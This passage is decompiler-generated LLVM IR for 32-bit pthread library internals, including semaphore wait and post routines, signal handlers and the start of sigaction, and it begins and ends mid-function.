  %v2_8057277 = call i32 @__pthread_set_own_extricate_if(i32 %v0_8057277, i32 %v0_8057221)
  %v0_805727c = load i32, i32* @esi, align 4
  %v1_805727c = add i32 %v0_805727c, 440
  %v2_805727c = inttoptr i32 %v1_805727c to i8*
  %v3_805727c = load i8, i8* %v2_805727c, align 1
  %v4_805727c = icmp eq i8 %v3_805727c, 0
  br i1 %v4_805727c, label %dec_label_pc_80572b9, label %dec_label_pc_8057285

dec_label_pc_8057285:                             ; preds = %dec_label_pc_8057273
  %v1_8057285 = add i32 %v0_805727c, 64
  %v2_8057285 = inttoptr i32 %v1_8057285 to i8*
  %v3_8057285 = load i8, i8* %v2_8057285, align 1
  %v4_8057285 = icmp eq i8 %v3_8057285, 0
  %v1_8057289 = icmp eq i1 %v4_8057285, false
  br i1 %v1_8057289, label %dec_label_pc_80572b9, label %dec_label_pc_805728b

dec_label_pc_805728b:                             ; preds = %dec_label_pc_8057285
  store i8 0, i8* %v2_805727c, align 1
  br label %dec_label_pc_8057292

dec_label_pc_8057292:                             ; preds = %dec_label_pc_8057214, %dec_label_pc_805728b
  store i32 -1, i32* %stack_var_-60, align 4
  %v2_805729b = call i32 @__pthread_do_exit(i32 -1, i32 %v4_805716d)
  br label %dec_label_pc_80572a0

dec_label_pc_80572a0:                             ; preds = %dec_label_pc_805722f, %dec_label_pc_8057292
  %stack_var_-56.0 = phi i32 [ %v4_805716d, %dec_label_pc_8057292 ], [ %v0_8057221, %dec_label_pc_805722f ]
  store i32 0, i32* @edx, align 4
  %v0_80572a2 = load i32, i32* @esi, align 4
  store i32 %v0_80572a2, i32* @eax, align 4
  %v0_80572a4 = load i32, i32* %stack_var_-60, align 4
  %v2_80572a4 = call i32 @__pthread_set_own_extricate_if(i32 %v0_80572a4, i32 %stack_var_-56.0)
  %v1_80572a9 = call i32 @__errno_location(i32 %v0_80572a4)
  %v1_80572ae = inttoptr i32 %v1_80572a9 to i32*
  store i32 110, i32* %v1_80572ae, align 4
  br label %dec_label_pc_80572bb

dec_label_pc_80572b9:                             ; preds = %dec_label_pc_8057285, %dec_label_pc_8057273
  br label %dec_label_pc_80572bb

dec_label_pc_80572bb:                             ; preds = %dec_label_pc_80572a0, %dec_label_pc_80571c1, %dec_label_pc_80572b9
  %v0_80572c2 = phi i32 [ -1, %dec_label_pc_80572a0 ], [ %storemerge, %dec_label_pc_80571c1 ], [ 0, %dec_label_pc_80572b9 ]
  ret i32 %v0_80572c2

; uselistorder directives
  uselistorder i32 %v0_805725b, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 %v0_805723d, { 1, 0 }
  uselistorder i32 %v0_8057222, { 1, 0 }
  uselistorder i32 %v3_8057189, { 1, 0 }
  uselistorder i32 %v0_8057189, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-60, { 3, 4, 1, 5, 0, 6, 2, 7, 8, 9 }
  uselistorder i32* %stack_var_-24, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80572bb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80572a0, { 1, 0 }
  uselistorder label %dec_label_pc_8057292, { 1, 0 }
  uselistorder label %dec_label_pc_805725b, { 1, 0 }
  uselistorder label %dec_label_pc_8057204, { 1, 0 }
  uselistorder label %dec_label_pc_80571c1, { 1, 0 }
}

define i32 @__new_sem_wait(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_80572c3 = load i32, i32* @esi, align 4
  %v0_80572c4 = load i32, i32* @ebx, align 4
  store i32 %v0_80572c4, i32* %stack_var_-8, align 4
  %v4_80572c4 = ptrtoint i32* %stack_var_-8 to i32
  %v2_80572c8 = call i32 @thread_self.1(i32 %v0_80572c4, i32 %v0_80572c3)
  store i32 %arg1, i32* @ebx, align 4
  store i32 %v2_80572c8, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v1_80572e7 = call i32 @__pthread_lock(i32 %arg1)
  %v0_80572ec = load i32, i32* @ebx, align 4
  %v1_80572ec = add i32 %v0_80572ec, 8
  %v2_80572ec = inttoptr i32 %v1_80572ec to i32*
  %v3_80572ec = load i32, i32* %v2_80572ec, align 4
  %tmp12 = icmp slt i32 %v3_80572ec, 1
  br i1 %tmp12, label %dec_label_pc_8057308, label %dec_label_pc_80572f3

dec_label_pc_80572f3:                             ; preds = %entry
  %v1_80572f6 = add i32 %v3_80572ec, -1
  store i32 %v1_80572f6, i32* %v2_80572ec, align 4
  %v0_80572fa = load i32, i32* @ebx, align 4
  store i32 %v0_80572fa, i32* %stack_var_-44, align 4
  %v1_80572fb = inttoptr i32 %v0_80572fa to i32*
  %v2_80572fb = call i32 @__pthread_unlock(i32* %v1_80572fb)
  br label %dec_label_pc_80573cc

dec_label_pc_8057308:                             ; preds = %entry
  %v2_805730c = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805730c, i32* @edx, align 4
  %v1_8057310 = add i32 %v2_80572c8, 442
  %v2_8057310 = inttoptr i32 %v1_8057310 to i8*
  store i8 0, i8* %v2_8057310, align 1
  store i32 %v2_80572c8, i32* @eax, align 4
  %v0_805731b = load i32, i32* %stack_var_-44, align 4
  %v2_805731b = call i32 @__pthread_set_own_extricate_if(i32 %v0_805731b, i32 %tmp8)
  %v1_8057324 = add i32 %v2_80572c8, 66
  %v2_8057324 = inttoptr i32 %v1_8057324 to i8*
  %v3_8057324 = load i8, i8* %v2_8057324, align 1
  %v4_8057324 = icmp eq i8 %v3_8057324, 0
  br i1 %v4_8057324, label %dec_label_pc_8057339, label %dec_label_pc_805732a

dec_label_pc_805732a:                             ; preds = %dec_label_pc_8057308
  store i32 1, i32* @esi, align 4
  %v1_8057333 = add i32 %v2_80572c8, 64
  %v2_8057333 = inttoptr i32 %v1_8057333 to i8*
  %v3_8057333 = load i8, i8* %v2_8057333, align 1
  %v4_8057333 = icmp eq i8 %v3_8057333, 0
  br i1 %v4_8057333, label %dec_label_pc_8057347, label %dec_label_pc_8057339

dec_label_pc_8057339:                             ; preds = %dec_label_pc_805732a, %dec_label_pc_8057308
  store i32 %v2_80572c8, i32* @edx, align 4
  %v0_8057340 = call i32 @enqueue()
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8057347

dec_label_pc_8057347:                             ; preds = %dec_label_pc_805732a, %dec_label_pc_8057339
  %v0_805734a = load i32, i32* @ebx, align 4
  store i32 %v0_805734a, i32* %stack_var_-44, align 4
  %v1_805734b = inttoptr i32 %v0_805734a to i32*
  %v2_805734b = call i32 @__pthread_unlock(i32* %v1_805734b)
  %v0_8057353 = load i32, i32* @esi, align 4
  %v1_8057353 = icmp eq i32 %v0_8057353, 0
  br i1 %v1_8057353, label %dec_label_pc_8057364.preheader, label %dec_label_pc_8057357

dec_label_pc_8057364.preheader:                   ; preds = %dec_label_pc_8057347
  %v1_805737e = add i32 %v2_80572c8, 440
  %v2_805737e = inttoptr i32 %v1_805737e to i8*
  %v1_805738b = add i32 %v2_80572c8, 64
  %v2_805738b = inttoptr i32 %v1_805738b to i8*
  store i32 %v2_80572c8, i32* @eax, align 4
  %v0_805736813 = call i32 @suspend()
  %v3_805737114 = load i8, i8* %v2_8057310, align 1
  %v4_805737115 = icmp eq i8 %v3_805737114, 0
  %v1_805737816 = icmp eq i1 %v4_805737115, false
  br i1 %v1_805737816, label %dec_label_pc_8057391, label %dec_label_pc_805737a

dec_label_pc_8057357:                             ; preds = %dec_label_pc_8057347
  store i32 %v2_80572c8, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_805735d = load i32, i32* %stack_var_-44, align 4
  %v2_805735d = call i32 @__pthread_set_own_extricate_if(i32 %v0_805735d, i32 %tmp8)
  br label %dec_label_pc_80573be

dec_label_pc_805737a:                             ; preds = %dec_label_pc_8057364.preheader, %dec_label_pc_8057364.backedge
  %v3_805737e = load i8, i8* %v2_805737e, align 1
  %v4_805737e = icmp eq i8 %v3_805737e, 0
  br i1 %v4_805737e, label %dec_label_pc_8057364.backedge, label %dec_label_pc_8057387

dec_label_pc_8057364.backedge:                    ; preds = %dec_label_pc_805737a, %dec_label_pc_8057387
  store i32 %v2_80572c8, i32* @eax, align 4
  %v0_8057368 = call i32 @suspend()
  %v3_8057371 = load i8, i8* %v2_8057310, align 1
  %v4_8057371 = icmp eq i8 %v3_8057371, 0
  %v1_8057378 = icmp eq i1 %v4_8057371, false
  br i1 %v1_8057378, label %dec_label_pc_8057391, label %dec_label_pc_805737a

dec_label_pc_8057387:                             ; preds = %dec_label_pc_805737a
  %v3_805738b = load i8, i8* %v2_805738b, align 1
  %v4_805738b = icmp eq i8 %v3_805738b, 0
  %v1_805738f = icmp eq i1 %v4_805738b, false
  br i1 %v1_805738f, label %dec_label_pc_8057364.backedge, label %dec_label_pc_8057391

dec_label_pc_8057391:                             ; preds = %dec_label_pc_8057364.backedge, %dec_label_pc_8057387, %dec_label_pc_8057364.preheader
  store i32 %v2_80572c8, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_8057397 = load i32, i32* %stack_var_-44, align 4
  %v2_8057397 = call i32 @__pthread_set_own_extricate_if(i32 %v0_8057397, i32 %tmp8)
  %v3_80573a0 = load i8, i8* %v2_805737e, align 1
  %v4_80573a0 = icmp eq i8 %v3_80573a0, 0
  br i1 %v4_80573a0, label %dec_label_pc_80573cc, label %dec_label_pc_80573a9

dec_label_pc_80573a9:                             ; preds = %dec_label_pc_8057391
  %v3_80573ad = load i8, i8* %v2_805738b, align 1
  %v4_80573ad = icmp eq i8 %v3_80573ad, 0
  %v1_80573b1 = icmp eq i1 %v4_80573ad, false
  br i1 %v1_80573b1, label %dec_label_pc_80573cc, label %dec_label_pc_80573b3

dec_label_pc_80573b3:                             ; preds = %dec_label_pc_80573a9
  store i8 0, i8* %v2_805737e, align 1
  br label %dec_label_pc_80573be

dec_label_pc_80573be:                             ; preds = %dec_label_pc_8057357, %dec_label_pc_80573b3
  store i32 -1, i32* %stack_var_-44, align 4
  %v2_80573c7 = call i32 @__pthread_do_exit(i32 -1, i32 %v4_80572c4)
  br label %dec_label_pc_80573cc

dec_label_pc_80573cc:                             ; preds = %dec_label_pc_80573a9, %dec_label_pc_8057391, %dec_label_pc_80572f3, %dec_label_pc_80573be
  ret i32 0

; uselistorder directives
  uselistorder i8* %v2_805737e, { 1, 0, 2 }
  uselistorder i8* %v2_8057310, { 1, 0, 2 }
  uselistorder i32 %v3_80572ec, { 1, 0 }
  uselistorder i32 %v2_80572c8, { 5, 6, 2, 0, 3, 4, 7, 1, 9, 8, 10, 11 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32 %tmp8, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 3, 0, 1, 4, 2, 5 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 ()* @suspend, { 2, 0, 1 }
  uselistorder i32 ()* @enqueue, { 1, 0 }
  uselistorder i32 (i32, i32)* @__pthread_set_own_extricate_if, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80573cc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80573be, { 1, 0 }
  uselistorder label %dec_label_pc_8057391, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8057364.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_805737a, { 1, 0 }
  uselistorder label %dec_label_pc_8057347, { 1, 0 }
}

define i32 @__new_sem_post() local_unnamed_addr {
entry:
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp13, i32* %stack_var_-188, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80573d4 = load i32, i32* @esi, align 4
  %v0_80573d5 = load i32, i32* @ebx, align 4
  store i32 %v0_80573d5, i32* %stack_var_-8, align 4
  %v2_80573dc = call i32 @thread_self.1(i32 %v0_80573d5, i32 %v0_80573d4)
  store i32 %tmp8, i32* @esi, align 4
  %v1_80573e8 = add i32 %v2_80573dc, 84
  %v2_80573e8 = inttoptr i32 %v1_80573e8 to i32*
  %v3_80573e8 = load i32, i32* %v2_80573e8, align 4
  %v4_80573e8 = icmp eq i32 %v3_80573e8, 0
  %v1_80573ec = icmp eq i1 %v4_80573e8, false
  br i1 %v1_80573ec, label %dec_label_pc_8057465, label %dec_label_pc_80573ee

dec_label_pc_80573ee:                             ; preds = %entry
  store i32 %v2_80573dc, i32* @edx, align 4
  store i32 %tmp8, i32* @eax, align 4
  %v0_80573f2 = load i32, i32* %stack_var_-8, align 4
  %v1_80573f2 = call i32 @__pthread_lock(i32 %v0_80573f2)
  %v0_80573f7 = load i32, i32* @esi, align 4
  %v1_80573f7 = add i32 %v0_80573f7, 12
  %v2_80573f7 = inttoptr i32 %v1_80573f7 to i32*
  %v3_80573f7 = load i32, i32* %v2_80573f7, align 4
  %v4_80573f7 = icmp eq i32 %v3_80573f7, 0
  %v1_80573fb = icmp eq i1 %v4_80573f7, false
  br i1 %v1_80573fb, label %dec_label_pc_805744b, label %dec_label_pc_80573fd

dec_label_pc_80573fd:                             ; preds = %dec_label_pc_80573ee
  %v1_80573fd = add i32 %v0_80573f7, 8
  %v2_80573fd = inttoptr i32 %v1_80573fd to i32*
  %v3_80573fd = load i32, i32* %v2_80573fd, align 4
  %v9_8057400 = icmp eq i32 %v3_80573fd, 2147483647
  %v1_8057405 = icmp eq i1 %v9_8057400, false
  br i1 %v1_8057405, label %dec_label_pc_8057420, label %dec_label_pc_8057407

dec_label_pc_8057407:                             ; preds = %dec_label_pc_80573fd
  %v0_8057407 = load i32, i32* %stack_var_-8, align 4
  %v1_8057407 = call i32 @__errno_location(i32 %v0_8057407)
  %v1_805740f = inttoptr i32 %v1_8057407 to i32*
  store i32 34, i32* %v1_805740f, align 4
  %v0_8057415 = load i32, i32* @esi, align 4
  store i32 %v0_8057415, i32* %stack_var_-188, align 4
  %v1_8057416 = inttoptr i32 %v0_8057415 to i32*
  %v2_8057416 = call i32 @__pthread_unlock(i32* %v1_8057416)
  br label %dec_label_pc_805742f

dec_label_pc_8057420:                             ; preds = %dec_label_pc_80573fd
  %v1_8057420 = add i32 %v3_80573fd, 1
  store i32 %v1_8057420, i32* %v2_80573fd, align 4
  %v0_8057427 = load i32, i32* @esi, align 4
  store i32 %v0_8057427, i32* %stack_var_-188, align 4
  %v1_8057428 = inttoptr i32 %v0_8057427 to i32*
  %v2_8057428 = call i32 @__pthread_unlock(i32* %v1_8057428)
  br label %dec_label_pc_805742f

dec_label_pc_805742f:                             ; preds = %dec_label_pc_8057420, %dec_label_pc_805744b, %dec_label_pc_8057407
  %storemerge = phi i32 [ -1, %dec_label_pc_8057407 ], [ 0, %dec_label_pc_805744b ], [ 0, %dec_label_pc_8057420 ]
  br label %dec_label_pc_80574bb

dec_label_pc_805744b:                             ; preds = %dec_label_pc_80573ee
  store i32 %v3_80573f7, i32* @ebx, align 4
  %v1_805743e = add i32 %v3_80573f7, 8
  %v2_805743e = inttoptr i32 %v1_805743e to i32*
  %v3_805743e = load i32, i32* %v2_805743e, align 4
  store i32 %v3_805743e, i32* %v2_80573f7, align 4
  store i32 0, i32* %v2_805743e, align 4
  %v0_805744e.pre = load i32, i32* @esi, align 4
  store i32 %v0_805744e.pre, i32* %stack_var_-188, align 4
  %v1_805744f = inttoptr i32 %v0_805744e.pre to i32*
  %v2_805744f = call i32 @__pthread_unlock(i32* %v1_805744f)
  %v1_8057454 = add i32 %v3_80573f7, 442
  %v2_8057454 = inttoptr i32 %v1_8057454 to i8*
  store i8 1, i8* %v2_8057454, align 1
  store i32 %v3_80573f7, i32* %stack_var_-188, align 4
  %v1_805745e = call i32 @__pthread_restart_new(i32 %v3_80573f7)
  br label %dec_label_pc_805742f

dec_label_pc_8057465:                             ; preds = %entry
  %v0_8057465 = load i32, i32* @global_var_8074524.624, align 4
  %v2_8057465 = icmp slt i32 %v0_8057465, 0
  %v1_805746c = icmp eq i1 %v2_8057465, false
  br i1 %v1_805746c, label %dec_label_pc_8057493.preheader, label %dec_label_pc_805746e

dec_label_pc_8057493.preheader:                   ; preds = %dec_label_pc_805746e, %dec_label_pc_8057465
  %v2_8057493 = ptrtoint i32* %stack_var_-156 to i32
  br label %dec_label_pc_8057493

dec_label_pc_805746e:                             ; preds = %dec_label_pc_8057465
  %v1_805746e = call i32 @__pthread_initialize_manager(i32 %tmp13)
  %v2_8057473 = icmp slt i32 %v1_805746e, 0
  %v1_8057475 = icmp eq i1 %v2_8057473, false
  br i1 %v1_8057475, label %dec_label_pc_8057493.preheader, label %dec_label_pc_8057477

dec_label_pc_8057477:                             ; preds = %dec_label_pc_805746e
  %v0_8057477 = load i32, i32* %stack_var_-188, align 4
  %v1_8057477 = call i32 @__errno_location(i32 %v0_8057477)
  %v1_805747c = inttoptr i32 %v1_8057477 to i32*
  store i32 11, i32* %v1_805747c, align 4
  br label %dec_label_pc_80574bb

dec_label_pc_8057493:                             ; preds = %dec_label_pc_8057493.preheader, %dec_label_pc_80574af
  %v0_805749e = load i32, i32* @global_var_8074524.624, align 4
  store i32 %v0_805749e, i32* %stack_var_-188, align 4
  %v3_80574a4 = call i32 @__libc_write(i32 %v0_805749e, i32 %v2_8057493, i32 148)
  %v8_80574ac = icmp eq i32 %v3_80574a4, -1
  %v1_80574ad = icmp eq i1 %v8_80574ac, false
  br i1 %v1_80574ad, label %dec_label_pc_80574b9, label %dec_label_pc_80574af

dec_label_pc_80574af:                             ; preds = %dec_label_pc_8057493
  %v0_80574af = load i32, i32* %stack_var_-188, align 4
  %v1_80574af = call i32 @__errno_location(i32 %v0_80574af)
  %v1_80574b4 = inttoptr i32 %v1_80574af to i32*
  %v2_80574b4 = load i32, i32* %v1_80574b4, align 4
  %v11_80574b4 = icmp eq i32 %v2_80574b4, 4
  br i1 %v11_80574b4, label %dec_label_pc_8057493, label %dec_label_pc_80574b9

dec_label_pc_80574b9:                             ; preds = %dec_label_pc_80574af, %dec_label_pc_8057493
  br label %dec_label_pc_80574bb

dec_label_pc_80574bb:                             ; preds = %dec_label_pc_8057477, %dec_label_pc_805742f, %dec_label_pc_80574b9
  %v0_80574c3 = phi i32 [ -1, %dec_label_pc_8057477 ], [ %storemerge, %dec_label_pc_805742f ], [ 0, %dec_label_pc_80574b9 ]
  %v2_80574c1 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80574c1, i32* @ebx, align 4
  store i32 %v0_80573d4, i32* @esi, align 4
  ret i32 %v0_80574c3

; uselistorder directives
  uselistorder i32 %v3_80573fd, { 1, 0 }
  uselistorder i32 %v3_80573f7, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %stack_var_-8, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-188, { 2, 3, 1, 4, 5, 6, 7, 0 }
  uselistorder i32 (i32, i32)* @thread_self.1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_80574bb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057493, { 1, 0 }
  uselistorder label %dec_label_pc_805742f, { 1, 0, 2 }
}

define i32 @pthread_null_sighandler() local_unnamed_addr {
entry:
  %v0_80574c4 = load i32, i32* @eax, align 4
  ret i32 %v0_80574c4
}

define i32 @thread_self.2(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_80574cc = load i32, i32* @esp, align 4
  %v1_80574cc = load i32, i32* @global_var_8078e6c.615, align 4
  %v7_80574cc = icmp ult i32 %v0_80574cc, %v1_80574cc
  %v1_80574d2 = icmp eq i1 %v7_80574cc, false
  br i1 %v1_80574d2, label %dec_label_pc_8057503, label %dec_label_pc_80574d4

dec_label_pc_80574d4:                             ; preds = %entry
  %v1_80574d4 = load i32, i32* @global_var_8078e70.616, align 16
  %v7_80574d4 = icmp ult i32 %v0_80574cc, %v1_80574d4
  br i1 %v7_80574d4, label %dec_label_pc_80574e9, label %dec_label_pc_80574dc

dec_label_pc_80574dc:                             ; preds = %dec_label_pc_80574d4
  %v1_80574e1 = load i32, i32* @global_var_8078e74.618, align 4
  %v7_80574e1 = icmp ult i32 %v0_80574cc, %v1_80574e1
  br i1 %v7_80574e1, label %dec_label_pc_8057503, label %dec_label_pc_80574e9

dec_label_pc_80574e9:                             ; preds = %dec_label_pc_80574dc, %dec_label_pc_80574d4
  %v0_80574e9 = load i32, i32* @global_var_807e578.619, align 8
  %v1_80574e9 = icmp eq i32 %v0_80574e9, 0
  br i1 %v1_80574e9, label %dec_label_pc_80574f7, label %dec_label_pc_80574f2

dec_label_pc_80574f2:                             ; preds = %dec_label_pc_80574e9
  %v0_80574f2 = call i32 @__pthread_find_self()
  br label %dec_label_pc_80574f7

dec_label_pc_80574f7:                             ; preds = %dec_label_pc_80574e9, %dec_label_pc_80574f2
  %v2_80574fd = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_8057503

dec_label_pc_8057503:                             ; preds = %dec_label_pc_80574dc, %entry, %dec_label_pc_80574f7
  %v0_8057503 = phi i32 [ ptrtoint (i32* @global_var_8074340.617 to i32), %dec_label_pc_80574dc ], [ ptrtoint (i32* @global_var_8074160 to i32), %entry ], [ %v2_80574fd, %dec_label_pc_80574f7 ]
  ret i32 %v0_8057503

; uselistorder directives
  uselistorder label %dec_label_pc_8057503, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80574f7, { 1, 0 }
}

define i32 @pthread_sighandler_rt(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8057504 = load i32, i32* @edi, align 4
  %v0_8057505 = load i32, i32* @esi, align 4
  %v0_8057506 = load i32, i32* @ebx, align 4
  store i32 %v0_8057506, i32* %stack_var_-12, align 4
  %v3_8057507 = call i32 @thread_self.2(i32 %v0_8057506, i32 %v0_8057505, i32 %v0_8057504)
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %v3_8057507, i32* %ebx.global-to-local, align 4
  %v1_8057512 = add i32 %v3_8057507, 88
  %v2_8057512 = inttoptr i32 %v1_8057512 to i8*
  %v3_8057512 = load i8, i8* %v2_8057512, align 1
  %v4_8057512 = icmp eq i8 %v3_8057512, 0
  br i1 %v4_8057512, label %dec_label_pc_8057521, label %dec_label_pc_8057518

dec_label_pc_8057518:                             ; preds = %entry
  store i8 0, i8* %v2_8057512, align 1
  %v0_805751c = load i32, i32* %edi.global-to-local, align 4
  %v2_805751c = add i32 %v3_8057507, 32
  %v3_805751c = inttoptr i32 %v2_805751c to i32*
  store i32 %v0_805751c, i32* %v3_805751c, align 4
  br label %dec_label_pc_805754a

dec_label_pc_8057521:                             ; preds = %entry
  %v4_8057506 = ptrtoint i32* %stack_var_-12 to i32
  %v1_8057521 = add i32 %v3_8057507, 84
  %v2_8057521 = inttoptr i32 %v1_8057521 to i32*
  %v3_8057521 = load i32, i32* %v2_8057521, align 4
  %v1_8057524 = icmp eq i32 %v3_8057521, 0
  store i32 %v4_8057506, i32* %v2_8057521, align 4
  %v0_8057534 = load i32, i32* %edi.global-to-local, align 4
  %v5_8057535 = mul i32 %v0_8057534, 4
  %v6_8057535 = add i32 %v5_8057535, ptrtoint (i32* @global_var_8078d60.650 to i32)
  %v7_8057535 = inttoptr i32 %v6_8057535 to i32*
  %v8_8057535 = load i32, i32* %v7_8057535, align 4
  call void @__pseudo_call(i32 %v8_8057535)
  %v1_8057541 = icmp eq i1 %v1_8057524, false
  br i1 %v1_8057541, label %dec_label_pc_805754a, label %dec_label_pc_8057543

dec_label_pc_8057543:                             ; preds = %dec_label_pc_8057521
  %v0_8057543 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057543 = add i32 %v0_8057543, 84
  %v2_8057543 = inttoptr i32 %v1_8057543 to i32*
  store i32 0, i32* %v2_8057543, align 4
  br label %dec_label_pc_805754a

dec_label_pc_805754a:                             ; preds = %dec_label_pc_8057521, %dec_label_pc_8057518, %dec_label_pc_8057543
  %v2_805754a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805754a, i32* %ebx.global-to-local, align 4
  store i32 %v0_8057504, i32* %edi.global-to-local, align 4
  ret i32 %v3_8057507

; uselistorder directives
  uselistorder i32 %v3_8057507, { 2, 1, 0, 3, 4 }
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805754a, { 2, 0, 1 }
}

define i32 @pthread_sighandler(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_8 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805754e = load i32, i32* @edi, align 4
  %v0_805754f = load i32, i32* @esi, align 4
  %v0_8057550 = load i32, i32* @ebx, align 4
  store i32 %v0_8057550, i32* %stack_var_-12, align 4
  %v3_8057551 = call i32 @thread_self.2(i32 %v0_8057550, i32 %v0_805754f, i32 %v0_805754e)
  store i32 %v3_8057551, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %v3_8057551, i32* %ebx.global-to-local, align 4
  %v1_805755c = add i32 %v3_8057551, 88
  %v2_805755c = inttoptr i32 %v1_805755c to i8*
  %v3_805755c = load i8, i8* %v2_805755c, align 1
  %v4_805755c = icmp eq i8 %v3_805755c, 0
  br i1 %v4_805755c, label %dec_label_pc_805756b, label %dec_label_pc_8057562

dec_label_pc_8057562:                             ; preds = %entry
  store i8 0, i8* %v2_805755c, align 1
  %v0_8057566 = load i32, i32* @esi, align 4
  %v1_8057566 = load i32, i32* %eax.global-to-local, align 4
  %v2_8057566 = add i32 %v1_8057566, 32
  %v3_8057566 = inttoptr i32 %v2_8057566 to i32*
  store i32 %v0_8057566, i32* %v3_8057566, align 4
  br label %dec_label_pc_80575a2

dec_label_pc_805756b:                             ; preds = %entry
  %v4_8057550 = ptrtoint i32* %stack_var_-12 to i32
  %v1_805756b = add i32 %v3_8057551, 84
  %v2_805756b = inttoptr i32 %v1_805756b to i32*
  %v3_805756b = load i32, i32* %v2_805756b, align 4
  %v1_805756e = icmp eq i32 %v3_805756b, 0
  store i32 %v4_8057550, i32* %v2_805756b, align 4
  %v2_805757a = ptrtoint i32* %stack_var_8 to i32
  store i32 %v2_805757a, i32* %eax.global-to-local, align 4
  %v3_8057584 = bitcast i32* %stack_var_-104 to i16*
  %v4_8057584 = call i32 @memcpy(i16* %v3_8057584, i32 %v2_805757a, i32 88)
  store i32 %v4_8057584, i32* %eax.global-to-local, align 4
  %v0_805758c = load i32, i32* @esi, align 4
  %v5_805758d = mul i32 %v0_805758c, 4
  %v6_805758d = add i32 %v5_805758d, ptrtoint (i32* @global_var_8078d60.650 to i32)
  %v7_805758d = inttoptr i32 %v6_805758d to i32*
  %v8_805758d = load i32, i32* %v7_805758d, align 4
  call void @__pseudo_call(i32 %v8_805758d)
  %v1_8057599 = icmp eq i1 %v1_805756e, false
  br i1 %v1_8057599, label %dec_label_pc_80575a2, label %dec_label_pc_805759b

dec_label_pc_805759b:                             ; preds = %dec_label_pc_805756b
  %v0_805759b = load i32, i32* %ebx.global-to-local, align 4
  %v1_805759b = add i32 %v0_805759b, 84
  %v2_805759b = inttoptr i32 %v1_805759b to i32*
  store i32 0, i32* %v2_805759b, align 4
  br label %dec_label_pc_80575a2

dec_label_pc_80575a2:                             ; preds = %dec_label_pc_805756b, %dec_label_pc_8057562, %dec_label_pc_805759b
  %v2_80575a2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80575a2, i32* %ebx.global-to-local, align 4
  %v0_80575a5 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80575a5

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_80575a2, { 2, 0, 1 }
}

define i32 @__GI_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp9 = ptrtoint i32* %arg2 to i32
  %stack_var_-156 = alloca i32, align 4
  %v0_80575a7 = load i32, i32* @edi, align 4
  %v0_80575a8 = load i32, i32* @esi, align 4
  %v0_80575a9 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80575c5 = load i32, i32* @global_var_8074528.652, align 8
  %v12_80575c5 = icmp eq i32 %v1_80575c5, %arg1
  br i1 %v12_80575c5, label %dec_label_pc_805766f, label %dec_label_pc_80575d1

dec_label_pc_80575d1:                             ; preds = %entry
  %v1_80575d1 = load i32, i32* @global_var_807452c.636, align 4
  %v12_80575d1 = icmp eq i32 %v1_80575d1, %arg1
  br i1 %v12_80575d1, label %dec_label_pc_805766f, label %dec_label_pc_80575dd

dec_label_pc_80575dd:                             ; preds = %dec_label_pc_80575d1
  %v1_80575dd = load i32, i32* @global_var_8074530.627, align 16
  %v12_80575dd = icmp eq i32 %v1_80575dd, %arg1
  %v1_80575e3 = icmp eq i1 %v12_80575dd, false
  br i1 %v1_80575e3, label %dec_label_pc_80575ed, label %dec_label_pc_80575e5

dec_label_pc_80575e5:                             ; preds = %dec_label_pc_80575dd
